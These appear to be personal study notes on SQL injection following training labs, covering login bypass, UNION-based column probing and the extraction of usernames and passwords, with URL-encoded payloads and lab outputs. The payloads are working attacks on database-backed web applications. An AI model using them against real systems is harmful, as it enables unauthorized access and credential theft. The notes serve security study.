# SQL injection

## Example 1

https://insecure-website.com/products?category=Gifts

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

https://insecure-website.com/products?category=Gifts'--

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

https://insecure-website.com/products?category=Gifts%27+OR+1=1--

## URL decoding

- Single quote ('): %27 `encodeURIComponent` does **NOT** encode single quote
- Double qoute ("): %22
- space ( ): + or %20
- Comma (,): %2C

To build URL, using Chrome debug console to run `encodeURIComponent("Gifts' UNION SELECT NULL,NULL,NULL--")`

## Lab: SQL injection vulnerability allowing login bypass

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

-- bypass the password
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'bluecheese'
```

Login as administrator, with any password.

From Burp Suite, intercept POST request

```
// From
csrf=nc1SgyYgCJsHaE3oyFvpZYV6vw0s4dAG&username=administrator&password=password
// To
csrf=nc1SgyYgCJsHaE3oyFvpZYV6vw0s4dAG&username=administrator'--&password=password
```

## Retrieving data from other database tables

### Union attacks

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

Union rules

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

### Example

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
UNION SELECT username, password FROM USERS--
```

Given input "Gifts", attacker submit the input:

```
' UNION SELECT username, password FROM USERS--
```

### Determining # of columns

```
' ORDER BY 1-- order by first column
' ORDER BY 2--
' ORDER BY 3--
...
```

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

```
page?category=Accessories%27+union+select+null,null,null--
```

In Oracle, every `SELECT` requires a table. Use build-in table on Oracle called `DUAL`. e.g. `' UNION SELECT NULL, NULL FROM DUAL--`

### Finding columns data type

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Lab: SQL injection UNION attack, finding a column containing text

```javascript
encodeURIComponent("Gifts' UNION SELECT NULL,'TrA8nZ',NULL--")
// page?category=Gifts%27%20UNION%20SELECT%20NULL%2C%27TrA8nZ%27%2CNULL--
```

### LAB: SQL injection UNION attack, retrieving data from other tables

```javascript
encodeURIComponent("Accessories' union select username,password from users--")
// page?category=Accessories%27%20union%20select%20username%2Cpassword%20from%20users--
// administrator 5wmz82
```

### Lab: SQL injection UNION attack, retrieving multiple values in a single column

```
-- Oracle
' UNION SELECT username || '~' || password FROM users--

-- SQL
' UNION SELECT username + '~' + password FROM users--
```

```
administrator~s3cure
wiener~peter
carlos~montoya
...
```

```javascript
encodeURIComponent("Accessories' union select null,null--")
encodeURIComponent("Accessories' union select 'a',null--")
encodeURIComponent("Accessories' union select null,'a'--")
encodeURIComponent("Accessories' union select null, username from users--")
encodeURIComponent("Accessories' union select null, password from users--")
encodeURIComponent("Accessories' union select null, username + '~' + password from users--")
encodeURIComponent("Accessories' union select null, username || '~' || password from users--")
// Accessories'%20union%20select%20null%2C%20username%20%7C%7C%20'~'%20%7C%7C%20password%20from%20users--
// administrator~ajwpth
```

[SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
